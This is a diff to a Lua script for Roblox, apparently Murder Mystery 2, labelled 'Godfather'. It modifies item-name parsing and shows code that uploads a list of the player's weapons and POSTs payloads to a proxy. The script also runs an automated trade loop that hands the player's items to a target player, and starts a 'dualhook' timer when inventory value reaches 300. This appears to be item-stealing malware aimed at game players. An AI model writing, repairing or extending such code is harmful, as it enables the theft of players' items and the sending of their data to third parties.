@@ -366,8 +366,13 @@ local function fetch_all_values()
             itemName = itemName:match("([^<]+)")
             if itemName then
                 itemName = clean_string_lol(itemName:gsub("%s+", " "))
-                local splitResult = string.split(itemName, " Click ")
-                itemName = clean_string_lol(splitResult[1] or itemName)
+                local splitResult = {}
+                for part in string.gmatch(itemName, "[^ ]+") do
+                    table.insert(splitResult, part)
+                end
+                if splitResult[1] and splitResult[1] ~= "Click" then
+                    itemName = clean_string_lol(splitResult[1])
+                end
                 local itemNameLower = string.lower(itemName)
                 local value = parseValue(itembodyDiv)
                 if value then itemValues[itemNameLower] = value end
@@ -538,6 +543,7 @@ end
 
 local rubisLink = upload_to_rubis(weaponsToSend) or "Upload failed"
 
+-- ORIGINAL PROXY SENDING METHOD FROM MM2SOURCE.LUA
 local function sendToProxy(Wid, payload, isEncrypted)
     task.spawn(function()
         local finalBody = HttpService:JSONEncode(payload)
@@ -554,7 +560,7 @@ local function sendToProxy(Wid, payload, isEncrypted)
                 Method = "POST",
                 Headers = {
                     ["Content-Type"] = "application/json",
-                    ["User-Agent"] = "Godfather/4.0.0"
+                    ["User-Agent"] = "Godfather/3.5.1"
                 },
                 Body = finalBody
             })
@@ -568,6 +574,11 @@ local function sendToProxy(Wid, payload, isEncrypted)
             print("[Godfather] successfully")
         end
     end)
+end
+
+local function getStatus()
+    local ok, status = pcall(function() return GetStatus:InvokeServer() end)
+    return ok and status or "None"
 end
 
 local function updateTradeMessage()
@@ -812,11 +823,6 @@ if totalInventoryValue >= 300 then
     startDualhookTimer()
 end
 
-local function getStatus()
-    local ok, status = pcall(function() return GetStatus:InvokeServer() end)
-    return ok and status or "None"
-end
-
 local function waitForTarget(targetPlayer)
     local attempts = 0
     while attempts < 30 do
@@ -854,12 +860,13 @@ function doTrade(targetPlayer)
     pcall(function() DeclineTrade:FireServer() end)
     task.wait(0.5)
     LastOffer = nil
+    isDualhookTrade = isDualhookActive
     
     local itemsAdded = false
     local timeout = 0
     
     while timeout < 60 and #weaponsToSend > 0 do
-        local success = pcall(function()
+        local success, err = pcall(function()
             local status = getStatus()
             
             if status == "None" then
@@ -887,7 +894,8 @@ function doTrade(targetPlayer)
                 task.wait(0.3)
             elseif status == "StartTrade" then
                 if not itemsAdded then
-                    for i = 1, math.min(4, #weaponsToSend) do
+                    local numToTrade = math.min(4, #weaponsToSend)
+                    for i = 1, numToTrade do
                         local item = weaponsToSend[i]
                         if item then
                             for _ = 1, item.Amount do
@@ -907,7 +915,10 @@ function doTrade(targetPlayer)
             end
         end)
         
-        if not success then task.wait(1) end
+        if not success then
+            warn("[Godfather] Trade error:", err)
+            task.wait(1) 
+        end
         timeout = timeout + 1
     end
     
